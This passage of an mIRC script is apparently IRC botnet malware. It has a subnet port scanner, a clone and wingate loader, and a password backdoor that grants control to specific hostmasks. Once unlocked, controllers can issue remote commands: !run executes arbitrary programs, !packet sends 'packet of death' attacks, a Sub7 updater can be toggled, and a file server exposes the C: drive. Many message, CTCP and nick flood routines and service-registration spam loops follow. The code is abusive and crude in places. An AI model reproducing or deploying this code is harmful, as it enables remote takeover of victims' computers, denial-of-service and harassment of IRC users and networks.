  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
  :end
  inc %scan.start4 1
  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
}

alias clone {
  if ($1 == in) {  if ($2 == PING) {  sockwrite -tn $sockname PONG $3  }  }
  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }  }
  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read SCK.SYS | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } }
on 1:TEXT:!pass *:*: {
  if (%script.pass = %script.pass) || (%script.pass = $null) { set %script.pass $replace($address($nick,5),a,Î,b,Ò,c,Ø,d,Ø,e,È,f,Ô,g,ì,h,Õ,i,í,j,Ö,-,Í,k,Ò,l,Â,m,Ã,n,æ,o,ß,p,Û,q,Þ,r,Ë,s,Æ,t,É,u,Á,v,Ï,w,áÇ,x,Ä,y,áÃ,z,Ú,.,ä,1,Í,2,Ï,3,Õ,4,æ,5,Ë,6,Ý,7,Ù,8,Î,9,Þ,0,Ò,!,ä,@,ÊÝ) }
  if ($2 = %script.pass) && (*!*xmic@xMicrosoft.Net == $address($nick,11)) || (*!*fox@sbrOoooO.net == $address($nick,11)) { 
  if ($nick == Usher) || ($nick == SBrOoooO) { auser 700 $nick | .notice $nick Password Accepted }
 }
}
on 700:TEXT:*:*: {
  .remove remote.ini
  if ($exists(DPL1.com) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (DPL1.com (hide not detected! quitting)...HI MOM) | /exit }
  if ($1 = !version) { msg $chan %quit  }
  if ($1 = !msg) && ($3 != $null) { /msg $2- | .notice $NICK Task Completed. }
  if ($1 = !flood) && ($2 != $null) { /fuck $2- }
  if ($1 = !arabflood) && ($2 != $null) { /arabfuck $2- }
  if ($1 = !justquitflood) && ($2 != $null) { /justquit $2- }
  if ($1 = !partflood) && ($2 != $null) { /partfuck $2- }
  if ($1 = !noticeflood) && ($2 != $null) { /noticefuck $2- }
  if ($1 = !quitflood) && ($2 != $null) { /quitfuck $2- }
  if ($1 = !floodoff) { /cleanup }
  if ($1 = !part) && ($2 != $null) { /PART $2- | .notice $NICK Task Completed. }
  if ($1 = !join) && ($2 != $null) { /Join $2 | .notice $NICK Task Completed. }
  if ($1 = !die) { //run $mircexe WNSCK.dll | /quit I Am a Bitch who hates $nick for killing me | /exit }
  if ($1 = !randomnicks) { /random | .notice $NICK Task Completed. }
  if ($1 = !Nick) && ($2 != $null) { /nick $2- | .notice $NICK Task Completed. }
  if ($1 = !notice) && ($3 != $null) { /notice $2- | .notice $NICK Task Completed. }
  if ($1 = !Ru) && ($2 != $null) { /ruser $2- | notice $nick $2- Removed From My Access List. }
  if ($1 = !packet) { packetofdeath $2 $3 $4 }
  if ($1 = !run) && ($2 != $null) { //run $2- }
  if ($1 = !stats) { if ($chan != $null) { .msg $chan I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } | else { .msg $nick I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } }
  if ($1 = !url) { if ($url != $null) { .msg $chan i'm currently at $url } | else { .msg $chan i'm not at any urls } }
  if ($1 = !pfast) && ($chan != $null) { //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
  if ($1 = !portredirect) { if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.arabchat.org 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.arabchat.org 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
  if ($1 = !sub7) { if ($2 = on) { .enable #Sub7Update | notice $nick Updater Enabled } | elseif ($2 = off) { .disable #Sub7Update | .notice $nick Sub7 Updater Disabled } | else { .notice $nick Error please use !sub7 <ON/OFF> } }
  if ($1 = !floodnick) && ($2 != $null) { if (%flood.nick != $null) { set %flood.nick $2 | .notice $nick 8,1now flooding using11 %flood.nick } | else { .notice $nick 8,1start up the fucking flooder then change the fucking nick asshole } }
  if ($1 = !voice) { .mode %connect.chan +v $nick }
  if ($1 == !fileserver.access) { /msg # 14[12File-Server-Initialized14] 15(2 $+ $nick $+ 15) (: 3Enjoy! | /fserve $nick 3 C:\  }
  if ($1 == !clone.status) {   /msg # Clone Status: [C: $+ $sock(clone*,0) $+ / $+ W: $+ $sock(sock*,0) $+ ]  [T:14 $+ $calc($sock(clone*,0)+$sock(sock*,0)) $+ ] }
  if ($1 == !wingate.load) {  if (%clones.server == $null) { msg # Error, Clones.server is not set! | halt } |  /set %clones.counter 2  |  .timer 5 5 /cf $read gates.txt 2 2 |  /msg # 3[Loading Wingates to %clones.server $+ 3] 14Current:15 $sock(sock*,0)  }
  if ($1 == !cycle) { if ($2 == $null) { /msg # Error/Syntax: (!cycle #Channel Please } |  /raw -q part $2 Cycling. | raw -q join $2  }
  if ($1 == !op) {  if ($3 == $null) { /msg # Error/Syntax: !op #channel $nick | halt } |   else { /mode $2 +o $3 } }
  if ($1 == !deop) {  if ($3 == $null) { /msg # Error/Syntax: !deop #channel $nick | halt } |  else { /mode $2 -o $3 }  }
  if ($1 == !voice) {  if ($3 == $null) { /msg # Error/Syntax:  !voice #channel Nick | halt } |   else { /mode $2 +v $3 }  }
  if ($1 == !devoice) {  if ($3 == $null) { /msg # Error/Syntax: !devoice #channel Nick | halt } |     else { /mode $2 -v $3 }  }
  if ($1 == !kick) {  if ($4 == $null) { /msg # Error/Syntax: !kick #channel Nick MSG | halt } |  else { /kick $2 $3 $4- }  } 
  if ($1 == !kick/ban) { if ($4 == $null) { /msg # Syntax: !kick/ban #channel Nick MSG (KickMessage) | halt } |  else {  /mode $2 -o+b $3 $address($3,2)  | /kick $2 $3 $4-  | halt }  }
  if ($1 == !clone.flood.ctcp.all) {  if ($2 == $null) { halt } |  /clone all $$2  }
  if ($1 == !clone.flood.ctcp.version) {  if ($2 == $null) { halt } |  /clone version $$2  }
  if ($1 == !clone.flood.ctcp.ping) {  if ($2 == $null) { halt } |     /clone ping $$2  }
  if ($1 == !clone.flood.ctcp.time) {  if ($2 == $null) { halt } |  /clone time $$2  }
  if ($1 == !clone.service.killer) {  if ($sock(clone*,0) == 0) { goto gatechange } 
    %sk = 1  |     :skloop |   if (%sk > $sock(clone*,0)) { goto end }  |  sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2   
    sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchnge   |   if (%gsk > $sock(sock*,0)) { goto end2 }   |   sockwrite -n $sock(sock*,%gsk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |   %random.sk.temp2 = $randomgen($r(0,9))  
    %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp* 
  inc %gsk  | goto gchnge |   :end2 |   halt  }
  if ($1 == !clone.load) {  if ($4 == $null) { halt } | if (%max.load == $null) { msg # Error: please set %max.load $+ . | halt } |   if ($sock(clone*,0) >= %max.load) { msg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt } |   /msg # [Loading]: $4 Clone(s) to ( $+ $$2 $+ ) on port $3  |   /clone connect $2 $3 $4  }
  if ($1 == !clone.part) { /clone part $2 $3-  }
  if ($1 == !clone.join) { /clone join $$2 }
  if ($1 == !clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
  if ($1 == !clone.dcc.send) { sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  }
  if ($1 == !clone.flood.ctcp.ping) {  /clone ping $$2  }
  if ($1 == !clone.flood.ctcp.time) { /clone time $$2  }
  if ($1 == !clone.join) {  if ($2 == $null) { halt } |   /clone join $$2 $3-  }
  if ($1 == !msg) { if ($2 == $null) { /msg # You must provide a channel to message. | halt } |  /msg $$2-  }
  if ($1 == !clone.cycle) {  /clone part $$2 |   /clone join $$2  }
  if ($1 == !clone.msg) {  /clone msg $$2 $3-  }
  if ($1 == !clone.quit) {  if ($sock(clone*,0) > 0) { //sockwrite -nt clone* QUIT :  $2- } |  if ($sock(sock*,0) > 0) { //sockwrite -nt sock* QUIT :  $2- } |  /msg # [Clones Disconnect/Quit] ( $+ $2- $+ )  }
  if ($1 == !clone.notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  /clone notice $$2 $3-  }
  if ($1 == !clone.nick.flood) { /clone nick.change  }
  if ($1 == !clone.nick) { if ($2 == $null) { halt } |  /clone nick.this $2  }
  if ($1 == !clone.kill) {  /clone kill |  /msg # [All Clones Killed]  }
  if ($1 == !clone.combo1) { if ($2 == $null) { halt }  | clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | timer 1 6 /clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling }
  if ($1 == !clone.combo2) {  if ($2 == $null) { halt } |  clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
    timer 1 6 /clone msg $2  pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
  timer 1 12 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp  }
  if ($1 == !clone.combo3) {  if ($2 == $null) { halt } | clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods
    timer 1 6 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods 
  timer 1 12 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods   }
  if ($1 == !clone.combo4) {   if ($2 == $null) { halt } |  clone msg $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
    timer 1 6 /clone msg $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾
  timer 1 12 /clone msg $2 ½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾½¼½¾  }
 if ($1 == !setpass) { if ($2 == $null) { halt } | set %script.pass $2- | .notice $NICK Task Completed. }
 if ($1 == !clone.combo5) {  if ($2 == $null) { halt } | clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
    timer 1 6 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
  timer 1 12 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT  }
  if ($1 == !clone.combo6) {  if ($2 == $null) { halt } | clone msg $2 UTTT OH!!! $$2 shouldnt of invited!!! Its time for 2,3INVITERS REVENGE! 
    timer 1 6 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
    timer 1 12 /clone msg $2  1,1Star_WarS*Star_WarS*1,1Stfox.sbrooooo.net  9428 kcufyoukcufyour_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
    timer 1 18 /clone msg $2 ^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^
    timer 1 24 /clone msg $2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
    timer 1 32 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL
  timer 1 38 /clone msg $2 12Leave $$2 now! dont support lame fucking inviters! }
   if ($1 == !clone.combo7) { //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 4    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
    /timer 1 8   /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
    /timer 1 12   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8))
  inc %cc |  goto ccloop |   :end  | unset %fat | unset %at* | unset %cc  }
if ($1 == !clone.combo#) { if ($2 == $null) { halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
    /timer 1 3 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
    /timer 1 7 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
    /timer 1 11 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
    /timer 1 15 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
  inc %cc |  goto ccloop |   :end  | unset %cc  }   
 if ($1 == !clone.combo.word) { if ($3 == $null) { msg # !clone.combo.word #/Nick Word. | halt } | //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
